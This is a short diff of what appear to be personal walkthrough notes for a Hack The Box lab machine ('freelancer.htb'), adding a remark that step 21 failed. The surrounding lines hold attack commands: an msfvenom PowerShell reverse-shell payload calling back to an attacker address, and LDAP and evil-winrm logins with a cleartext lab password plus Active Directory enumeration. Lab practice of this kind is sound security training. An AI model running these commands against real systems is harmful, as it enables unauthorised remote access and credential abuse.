@@ -131,6 +131,8 @@ nxc ldap 10.10.11.5 -d freelancer.htb -u 'lorra199' -p 'PWN3D#l0rr@Armessa199' -
 //msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.52 LPORT=8000 -f ps1 > new_shell.ps1
 
 ==========(21)======================================================================================================================
+(21) fails...this is for reference purposes only
+
 evil-winrm -i freelancer.htb -u lorra199 -p 'PWN3D#l0rr@Armessa199'
 
 Get-ADObject -filter 'isDeleted -eq$true' -includeDeletedObjects -Properties * | select samaccountname, memberof, userprincipalname
